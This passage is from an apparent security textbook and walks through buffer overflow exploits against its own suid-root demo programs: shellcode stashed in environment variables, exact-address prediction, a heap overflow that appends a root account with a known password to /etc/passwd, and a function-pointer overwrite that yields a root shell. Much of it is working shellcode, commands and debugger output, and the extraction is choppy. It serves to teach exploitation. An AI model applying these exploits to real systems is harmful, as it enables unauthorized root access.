discovered.\nSometimes a buffer will be too small to hold even shellcode. Fortunately, there\nare other locations in memory where shellcode can be stashed. Environment\nvariables are used by the user shell for a variety of things, but what they are\nused for isn\u2019t as important as the fact they are located on the stack and can\nbe set from the shell. The example below sets an environment variable called\nMYVAR to the string test. This environment variable can be accessed by prepend-\ning a dollar sign to its name. In addition, the env command will show all the\nenvironment variables. Notice there are several default environment vari-\nGTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2\nLS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=4\n0;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;\n31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*\n.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35\n:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;\n35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;\n35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\nSimilarly, the shellcode can be put in an environment variable, but\nfirst it needs to be in a form we can easily manipulate. The shellcode from\nthe notesearch exploit can be used; we just need to put it into a file in binary\nform. The standard shell tools of head, grep, and cut can be used to isolate just\nreader@hacking:~/booksrc $ head exploit_notesearch.c\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\nreader@hacking:~/booksrc $ head exploit_notesearch.c | grep \"^\\\"\"\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\nreader@hacking:~/booksrc $ head exploit_notesearch.c | grep \"^\\\"\" | cut -d\\\" -f2\n\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\n\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\nThe first 10 lines of the program are piped into grep, which only shows the\nlines that begin with a quotation mark. This isolates the lines containing\nthe shellcode, which are then piped into cut using options to display only the\nBASH\u2019s for loop can actually be used to send each of these lines to an\necho command, with command-line options to recognize hex expansion and\nreader@hacking:~/booksrc $ for i in $(head exploit_notesearch.c | grep \"^\\\"\" | cut -d\\\" -f2)\nreader@hacking:~/booksrc $ hexdump -C shellcode.bin\n00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|\n00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|\n00000020  e1 cd 80                                          |...|\nNow we have the shellcode in a file called shellcode.bin. This can be used\nwith command substitution to put shellcode into an environment variable,\nreader@hacking:~/booksrc $ export SHELLCODE=$(perl -e 'print \"\\x90\"x200')$(cat shellcode.bin)\n\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u00001\u00001\u00001\u0000\u0000\u0000 j\nAnd just like that, the shellcode is now on the stack in an environment\nvariable, along with a 200-byte NOP sled. This means we just need to find\nan address somewhere in that range of the sled to overwrite the saved return\naddress with. The environment variables are located near the bottom of the\nstack, so this is where we should look when running notesearch in a debugger.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nA breakpoint is set at the beginning of main(), and the program is run.\nThis will set up memory for the program, but it will stop before anything\nhappens. Now we can examine memory down near the bottom of the stack.\n0xbffffd56:      \"SHELLCODE=\", '\\220' <repeats 190 times>...\n0xbffff9ab:      \"\\220\\220\\220\\220\\220\\220\\220\\220\\220\\2201\u00ef\u00bf\u00bd1\u00ef\u00bf\u00bd1\u00ef\u00bf\u00bd\\231\u00ef\u00bf\u00bd\u00ef\u00bf\u00bd\u00ef\u00bf\u00bd\\200j\\vXQh//\n0xbffffa08:      \"GTK_RC_FILES=/etc/gtk/gtkrc:/home/reader/.gtkrc-1.2-gnome2\"\n\"LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=\n40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01\n\"1;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;3\n1:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01\n0xbffff8e3:      \"SHELLCODE=\", '\\220' <repeats 190 times>...\n0xbffff947:      '\\220' <repeats 110 times>, \"1\u00ef\u00bf\u00bd1\u00ef\u00bf\u00bd1\u00ef\u00bf\u00bd\\231\u00ef\u00bf\u00bd\u00ef\u00bf\u00bd\u00ef\u00bf\u00bd\\200j\\vXQh//shh/bin\\\nThe debugger reveals the location of the shellcode, shown in bold above.\n(When the program is run outside of the debugger, these addresses might\nbe a little different.) The debugger also has some information on the stack,\nwhich shifts the addresses around a bit. But with a 200-byte NOP sled, these\ninconsistencies aren\u2019t a problem if an address near the middle of the sled is\npicked. In the output above, the address 0xbffff947 is shown to be close to the\nmiddle of the NOP sled, which should give us enough wiggle room. After\ndetermining the address of the injected shellcode instructions, the exploita-\ntion is simply a matter of overwriting the return address with this address.\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x47\\xf9\\xff\\xbf\"x40')\nThe target address is repeated enough times to overflow the return address,\nand execution returns into the NOP sled in the environment variable, which\ninevitably leads to the shellcode. In situations where the overflow buffer isn\u2019t\nlarge enough to hold shellcode, an environment variable can be used with\na large NOP sled. This usually makes exploitations quite a bit easier.\nA huge NOP sled is a great aid when you need to guess at the target\nreturn addresses, but it turns out that the locations of environment variables\nare easier to predict than the locations of local stack variables. In C\u2019s standard\nlibrary there is a function called getenv(), which accepts the name of an environ-\nment variable as its only argument and returns that variable\u2019s memory address.\nThe code in getenv_example.c demonstrates the use of getenv().\nWhen compiled and run, this program will display the location of a given\nenvironment variable in its memory. This provides a much more accurate\nprediction of where the same environment variable will be when the target\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x0b\\xf9\\xff\\xbf\"x40')\nThis is accurate enough with a large NOP sled, but when the same thing\nis attempted without a sled, the program crashes. This means the environ-\nreader@hacking:~/booksrc $ export SLEDLESS=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x46\\xff\\xff\\xbf\"x40')\nIn order to be able to predict an exact memory address, the differences\nin the addresses must be explored. The length of the name of the program\nbeing executed seems to have an effect on the address of the environment\nvariables. This effect can be further explored by changing the name of the\nprogram and experimenting. This type of experimentation and pattern\nrecognition is an important skill for a hacker to have.\nAs the preceding experiment shows, the length of the name of the execut-\ning program has an effect on the location of exported environment variables.\nThe general trend seems to be a decrease of two bytes in the address of the\nenvironment variable for every single-byte increase in the length of the pro-\ngram name. This holds true with the program name a.out, since the differ-\nence in length between the names a.out and a is four bytes, and the difference\nbetween the address 0xbfffff4e and 0xbfffff46 is eight bytes. This must mean\nthe name of the executing program is also located on the stack somewhere,\nArmed with this knowledge, the exact address of the environment vari-\nable can be predicted when the vulnerable program is executed. This means\nthe crutch of a NOP sled can be eliminated. The getenvaddr.c program\nadjusts the address based on the difference in program name length to provide\nprintf(\"Usage: %s <environment var> <target program name>\\n\", argv[0]);\nptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */\nWhen compiled, this program can accurately predict where an environ-\nment variable will be in memory during a target program\u2019s execution. This\ncan be used to exploit stack-based buffer overflows without the need for a\nreader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c\nreader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x3c\\xff\\xff\\xbf\"x40')\nAs you can see, exploit code isn\u2019t always needed to exploit programs. The\nuse of environment variables simplifies things considerably when exploiting\nfrom the command line, but these variables can also be used to make exploit\nThe system() function is used in the notesearch_exploit.c program to\nexecute a command. This function starts a new process and runs the com-\nmand using /bin/sh -c. The -c tells the sh program to execute commands\nfrom the command-line argument passed to it. Google\u2019s code search can\nbe used to find the source code for this function, which will tell us more.\nGo to http://www.google.com/codesearch?q=package:libc+system to see\nwhile ((waitstat = wait(&ret)) != pid && waitstat != -1);\nThe important part of this function is shown in bold. The fork() function\nstarts a new process, and the execl() function is used to run the command\nthrough /bin/sh with the appropriate command-line arguments.\nThe use of system() can sometimes cause problems. If a setuid program\nuses system(), the privileges won\u2019t be transferred, because /bin/sh has been\ndropping privileges since version two. This isn\u2019t the case with our exploit, but\nthe exploit doesn\u2019t really need to be starting a new process, either. We can\nignore the fork() and just focus on the execl() function to run the command.\nThe execl() function belongs to a family of functions that execute com-\nmands by replacing the current process with the new one. The arguments for\nexecl() start with the path to the target program and are followed by each of\nthe command-line arguments. The second function argument is actually the\nzeroth command-line argument, which is the name of the program. The last\nargument is a NULL to terminate the argument list, similar to how a null\nThe execl() function has a sister function called execle(), which has one\nadditional argument to specify the environment under which the executing\nprocess should run. This environment is presented in the form of an array of\npointers to null-terminated strings for each environment variable, and the\nenvironment array itself is terminated with a NULL pointer.\nWith execl(), the existing environment is used, but if you use execle(),\nthe entire environment can be specified. If the environment array is just the\nshellcode as the first string (with a NULL pointer to terminate the list), the\nonly environment variable will be the shellcode. This makes its address easy\nto calculate. In Linux, the address will be 0xbffffffa, minus the length of the\nshellcode in the environment, minus the length of the name of the executed\nprogram. Since this address will be exact, there is no need for a NOP sled. All\nthat\u2019s needed in the exploit buffer is the address, repeated enough times to\noverflow the return address in the stack, as shown in exploit_nosearch_env.c.\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\nret = 0xbffffffa - (sizeof(shellcode)-1) - strlen(\"./notesearch\");\nexecle(\"./notesearch\", \"notesearch\", buffer, 0, env);\nThis exploit is more reliable, since it doesn\u2019t need a NOP sled or any\nguesswork regarding offsets. Also, it doesn\u2019t start any additional processes.\nreader@hacking:~/booksrc $ gcc exploit_notesearch_env.c\nBuffer overflows can happen in other memory segments, like heap and bss.\nAs in auth_overflow.c, if an important variable is located after a buffer\nvulnerable to an overflow, the program\u2019s control flow can be altered. This\nis true regardless of the memory segment these variables reside in; however,\nthe control tends to be quite limited. Being able to find these control points\nand learning to make the most of them just takes some experience and\ncreative thinking. While these types of overflows aren\u2019t as standardized as\nstack-based overflows, they can be just as effective.\nThe notetaker program from Chapter 2 is also susceptible to a buffer over-\nflow vulnerability. Two buffers are allocated on the heap, and the first\ncommand-line argument is copied into the first buffer. An overflow can\nif(argc < 2)                // If there aren't command-line arguments,\nusage(argv[0], datafile); // display usage message and exit.\nprintf(\"[DEBUG] buffer   @ %p: \\'%s\\'\\n\", buffer, buffer);\nprintf(\"[DEBUG] datafile @ %p: \\'%s\\'\\n\", datafile, datafile);\nUnder normal conditions, the buffer allocation is located at 0x804a008,\nwhich is before the datafile allocation at 0x804a070, as the debugging output\nshows. The distance between these two addresses is 104 bytes.\nSince the first buffer is null terminated, the maximum amount of data\nthat can be put into this buffer without overflowing into the next should be\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"A\"x104')\n[DEBUG] buffer   @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n[!!] Fatal Error in main() while opening file: No such file or directory\nAs predicted, when 104 bytes are tried, the null-termination byte over-\nflows into the beginning of the datafile buffer. This causes the datafile to\nbe nothing but a single null byte, which obviously cannot be opened as a file.\nBut what if the datafile buffer is overwritten with something more than just a\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"A\"x104 . \"testfile\"')\n[DEBUG] buffer   @ 0x804a008: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***\n/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]\n/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]\n08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n0804a000-0806b000 rw-p 0804a000 00:00 0          [heap]\nb7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so\nb8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so\nbffeb000-c0000000 rw-p bffeb000 00:00 0          [stack]\nffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]\nThis time, the overflow is designed to overwrite the datafile buffer with\nthe string testfile. This causes the program to write to testfile instead of\n/var/notes, as it was originally programmed to do. However, when the heap\nmemory is freed by the free() command, errors in the heap headers are\ndetected and the program is terminated. Similar to the return address\noverwrite with stack overflows, there are control points within the heap\narchitecture itself. The most recent version of glibc uses heap memory\nmanagement functions that have evolved specifically to counter heap\nunlinking attacks. Since version 2.2.5, these functions have been rewritten\nto print debugging information and terminate the program when they\ndetect problems with the heap header information. This makes heap\nunlinking in Linux very difficult. However, this particular exploit doesn\u2019t\nuse heap header information to do its magic, so by the time free() is called,\nthe program has already been tricked into writing to a new file with root\nreader@hacking:~/booksrc $ grep -B10 free notetaker.c\nif(write(fd, buffer, strlen(buffer)) == -1) // Write note.\n-rw------- 1 root reader 118 2007-09-09 16:19 ./testfile\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nA string is read until a null byte is encountered, so the entire string is\nwritten to the file as the userinput. Since this is a suid root program, the file\nthat is created is owned by root. This also means that since the filename can\nbe controlled, data can be appended to any file. This data does have some\nrestrictions, though; it must end with the controlled filename, and a line with\nThere are probably several clever ways to exploit this type of capability.\nThe most apparent one would be to append something to the /etc/passwd\nfile. This file contains all of the usernames, IDs, and login shells for all the\nusers of the system. Naturally, this is a critical system file, so it is a good idea\nto make a backup copy before messing with it too much.\nreader@hacking:~/booksrc $ cp /etc/passwd /tmp/passwd.bkup\nThe fields in the /etc/passwd file are delimited by colons, the first field\nbeing for login name, then password, user ID, group ID, username, home\ndirectory, and finally the login shell. The password fields are all filled with\nthe x character, since the encrypted passwords are stored elsewhere in a\nshadow file. (However, this field can contain the encrypted password.)\nIn addition, any entry in the password file that has a user ID of 0 will be given\nroot privileges. That means the goal is to append an extra entry with\nboth root privileges and a known password to the password file.\nThe password can be encrypted using a one-way hashing algorithm.\nBecause the algorithm is one way, the original password cannot be recreated\nfrom the hash value. To prevent lookup attacks, the algorithm uses a salt\nvalue, which when varied creates a different hash value for the same input\npassword. This is a common operation, and Perl has a crypt() function that\nperforms it. The first argument is the password, and the second is the salt\nvalue. The same password with a different salt produces a different salt.\nreader@hacking:~/booksrc $ perl -e 'print crypt(\"password\", \"AA\"). \"\\n\"'\nreader@hacking:~/booksrc $ perl -e 'print crypt(\"password\", \"XX\"). \"\\n\"'\nNotice that the salt value is always at the beginning of the hash. When a\nuser logs in and enters a password, the system looks up the encrypted password\nfor that user. Using the salt value from the stored encrypted password, the\nsystem uses the same one-way hashing algorithm to encrypt whatever text\nthe user typed as the password. Finally, the system compares the two hashes;\nif they are the same, the user must have entered the correct password. This\nallows the password to be used for authentication without requiring that the\nUsing one of these hashes in the password field will make the password\nfor the account be password, regardless of the salt value used. The line to\nappend to /etc/passwd should look something like this:\nHowever, the nature of this particular heap overflow exploit won\u2019t allow\nthat exact line to be written to /etc/passwd, because the string must end with\n/etc/passwd. However, if that filename is merely appended to the end of\nthe entry, the passwd file entry would be incorrect. This can be compensated\nfor with the clever use of a symbolic file link, so the entry can both end with\n/etc/passwd and still be a valid line in the password file. Here\u2019s how it works:\nreader@hacking:~/booksrc $ ln -s /bin/bash /tmp/etc/passwd\nlrwxrwxrwx 1 reader reader 9 2007-09-09 16:25 /tmp/etc/passwd -> /bin/bash\nNow /tmp/etc/passwd points to the login shell /bin/bash. This means\nthat a valid login shell for the password file is also /tmp/etc/passwd, making\nThe values of this line just need to be slightly modified so that the portion\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:me:/root:/tmp\"' | wc -c\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x50 . \":/root:/tmp\"'\nreader@hacking:~/booksrc $ perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x68 . \":/root:/tmp\"'\nIf /etc/passwd is added to the end of that final string (shown in bold), the\nstring above will be appended to the end of the /etc/passwd file. And since\nthis line defines an account with root privileges with a password we set, it won\u2019t\nbe difficult to access this account and obtain root access, as the following\nreader@hacking:~/booksrc $ ./notetaker $(perl -e 'print \"myroot:XXq2wKiyI43A2:0:0:\" . \"A\"x68 .\n[DEBUG] buffer   @ 0x804a008: 'myroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'\n*** glibc detected *** ./notetaker: free(): invalid next size (normal): 0x0804a008 ***\n/lib/tls/i686/cmov/libc.so.6(cfree+0x90)[0xb7f04e30]\n/lib/tls/i686/cmov/libc.so.6(__libc_start_main+0xdc)[0xb7eafebc]\n08048000-08049000 r-xp 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n08049000-0804a000 rw-p 00000000 00:0f 44384      /cow/home/reader/booksrc/notetaker\n0804a000-0806b000 rw-p 0804a000 00:00 0          [heap]\nb7e83000-b7e8e000 r-xp 00000000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e8e000-b7e8f000 rw-p 0000a000 07:00 15444      /rofs/lib/libgcc_s.so.1\nb7e9a000-b7fd5000 r-xp 00000000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd5000-b7fd6000 r--p 0013b000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fd6000-b7fd8000 rw-p 0013c000 07:00 15795      /rofs/lib/tls/i686/cmov/libc-2.5.so\nb7fe7000-b8000000 r-xp 00000000 07:00 15421      /rofs/lib/ld-2.5.so\nb8000000-b8002000 rw-p 00019000 07:00 15421      /rofs/lib/ld-2.5.so\nbffeb000-c0000000 rw-p bffeb000 00:00 0          [stack]\nffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]\navahi:x:105:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false\nhaldaemon:x:107:114:Hardware abstraction layer,,,:/home/haldaemon:/bin/false\nhplip:x:108:7:HPLIP system user,,,:/var/run/hplip:/bin/false\ngdm:x:109:118:Gnome Display Manager:/var/lib/gdm:/bin/false\nmyroot:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/\nIf you have played with the game_of_chance.c program enough, you will realize\nthat, similar to at a casino, most of the games are statistically weighted in\nfavor of the house. This makes winning credits difficult, despite how lucky\nyou might be. Perhaps there\u2019s a way to even the odds a bit. This program uses\na function pointer to remember the last game played. This pointer is stored\nin the user structure, which is declared as a global variable. This means all the\nmemory for the user structure is allocated in the bss segment.\n// Custom user struct to store information about users\nThe name buffer in the user structure is a likely place for an overflow.\nThis buffer is set by the input_name() function, shown below:\n// This function is used to input the player name, since\n// scanf(\"%s\", &whatever) will stop input at the first space.\nname_ptr = (char *) &(player.name); // name_ptr = player name's address\nwhile(input_char != '\\n') {  // Loop until newline.\n*name_ptr = input_char;   // Put the input char into name field.\nname_ptr++;               // Increment the name pointer.\nThis function only stops inputting at a newline character. There is nothing\nto limit it to the length of the destination name buffer, meaning an overflow\nis possible. In order to take advantage of the overflow, we need to make the\nprogram call the function pointer after it is overwritten. This happens in the\nplay_the_game() function, which is called when any game is selected from the\nmenu. The following code snippet is part of the menu selection code, used\nprintf(\"\\n[!!] The number %d is an invalid selection.\\n\\n\", choice);\nelse if (choice < 4) {  // Otherwise, choice was a game of some sort.\nif(choice != last_game) { // If the function ptr isn't set,\nif(choice == 1)        // then point it at the selected game\nIf last_game isn\u2019t the same as the current choice, the function pointer of\ncurrent_game is changed to the appropriate game. This means that in order to\nget the program to call the function pointer without overwriting it, a game\nmust be played first to set the last_game variable.\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nYou can temporarily suspend the current process by pressing CTRL-Z. At\nthis point, the last_game variable has been set to 1, so the next time 1 is\nselected, the function pointer will simply be called without being changed.\nBack at the shell, we figure out an appropriate overflow buffer, which can\nbe copied and pasted in as a name later. Recompiling the source with\ndebugging symbols and using GDB to run the program with a breakpoint\non main() allows us to explore the memory. As the output below shows, the\nname buffer is 100 bytes from the current_game pointer within the user\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nBreakpoint 1 at 0x8048813: file game_of_chance.c, line 41.\n41         srand(time(0)); // Seed the randomizer with the current time.\n$1 = {uid = 0, credits = 0, highscore = 0, name = '\\0' <repeats 99 times>,\nUsing this information, we can generate a buffer to overflow the name\nvariable with. This can be copied and pasted into the interactive Game of\nChance program when it is resumed. To return to the suspended process,\nreader@hacking:~/booksrc $ perl -e 'print \"A\"x100 . \"BBBB\" . \"\\n\"'\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nEnter your new name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSelect menu option 5 to change the username, and paste in the overflow\nbuffer. This will overwrite the function pointer with 0x42424242. When menu\noption 1 is selected again, the program will crash when it tries to call the\nfunction pointer. This is proof that execution can be controlled; now all\nthat\u2019s needed is a valid address to insert in place of BBBB.\nThe nm command lists symbols in object files. This can be used to find\nThe jackpot() function is a wonderful target for this exploit. Even though\nthe games give terrible odds, if the current_game function pointer is carefully\noverwritten with the address of the jackpot() function, you won\u2019t even have to\nplay the game to win credits. Instead, the jackpot() function will just be called\ndirectly, doling out the reward of 100 credits and tipping the scales in the\nThis program takes its input from standard input. The menu selections\ncan be scripted in a single buffer that is piped to the program\u2019s standard\ninput. These selections will be made as if they were typed. The following\nexample will choose menu item 1, try to guess the number 7, select n when\nasked to play again, and finally select menu item 7 to quit.\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n7\\nn\\n7\\n\"' | ./game_of_chance\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nPick a number between 1 and 20: The winning number is 20\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\nThis same technique can be used to script everything needed for the\nexploit. The following line will play the Pick a Number game once, then\nchange the username to 100 A\u2019s followed by the address of the jackpot()\nfunction. This will overflow the current_game function pointer, so when\nthe Pick a Number game is played again, the jackpot() function is called\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\nn\\n\" . \"7\\n\"' | ./game_of_chance\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nPick a number between 1 and 20: The winning number is 15\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAfter confirming that this method works, it can be expanded upon to\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n5\\nn\\n5\\n\" . \"A\"x100 . \"\\x70\\\nx8d\\x04\\x08\\n\" . \"1\\n\" . \"y\\n\"x10 . \"n\\n5\\nJon Erickson\\n7\\n\"' | ./\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nPick a number between 1 and 20: The winning number is 1\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAs you might have already noticed, this program also runs suid root.\nThis means shellcode can be used to do a lot more than win free credits. As\nwith the stack-based overflow, shellcode can be stashed in an environment\nvariable. After building a suitable exploit buffer, the buffer is piped to the\ngame_of_chance\u2019s standard input.  Notice the dash argument following the\nexploit buffer in the cat command.  This tells the cat program to send standard\ninput after the exploit buffer, returning control of the input.  Even though\nthe root shell doesn\u2019t display its prompt, it is still accessible and still escalates\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat ./shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./game_of_chance\nreader@hacking:~/booksrc $ perl -e 'print \"1\\n7\\nn\\n5\\n\" . \"A\"x100 . \"\\xe0\\\nreader@hacking:~/booksrc $ cat exploit_buffer - | ./game_of_chance\nThis game costs 10 credits to play. Simply pick a number\nbetween 1 and 20, and if you pick the winning number, you\nPick a number between 1 and 20: The winning number is 2\nWould you like to play again? (y/n)  -=[ Game of Chance Menu ]=-\n[Name: 